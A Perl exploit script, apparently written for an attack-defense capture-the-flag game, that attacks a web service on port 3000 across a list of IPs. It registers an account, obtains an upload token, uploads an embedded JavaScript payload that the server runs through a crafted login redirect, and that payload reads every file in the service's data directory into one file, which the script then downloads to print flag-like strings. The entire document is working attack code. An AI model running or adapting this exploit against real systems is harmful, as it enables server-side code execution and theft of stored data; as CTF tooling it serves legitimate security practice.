#!/usr/bin/perl

use LWP::UserAgent;

my $port = 3000;
my $js_inj = join '', <DATA>;

sub prepare_ua {
    my $ip = shift;

    my $ua = new LWP::UserAgent();
    $ua->cookie_jar({});
    push @{$ua->requests_redirectable}, 'POST';

    ($ua, "http://$ip:$port")
}

sub get_flags {
    my $ip = shift;
    my ($ua, $url) = prepare_ua($ip);
    my ($l, $p) = ("spl0t.$ip", "masterkey");

    my $r = $ua->post("$url/r", ['name' => $l, 'password' => $p]);
    return unless $r->is_success;

    my $exp = 'expl0it';
    $r = $ua->post("$url/me", ['name' => $exp, 'private' => $exp]);
    return unless $r->is_success;

    $r->content =~ /"(.*?)">\s*$exp/;
    $r = $ua->post("$url/u", Content_Type => 'form-data',
        Content => ['pdata' => $1, Filedata => [
            undef, '1.js', Content_Type => 'text/plain',
            Content => $js_inj]]);
    return unless $r->is_success;

    $r->content =~ /href="(.*?)">\s*here\s*<\/a> to download/i;
    my $link = $1;

    $r = $ua->get("$url/out");
    return unless $r->is_success;

    $r = $ua->post("$url/l?next=data.$link", ['name' => $l, 'password' => $p]);
    return unless $r->is_success;

    $r = $ua->get("$url/_xxx");
    $data = $r->content;
    print "\t$1\n" while $data =~ /(\w{31}=)/gm;
}

my @ips = @ARGV;

for my $ip (@ips) {
    print "Flags from '$ip':\n";
    get_flags($ip);
}

__DATA__
fs=require('fs');
fs.readdir('./data',function(e,f){s='';for(var i=0;i<f.length;++i){s+=fs.readFileSync('./data/'+f[i],'utf8');}fs.writeFileSync('./data/_xxx',s,'utf8')});
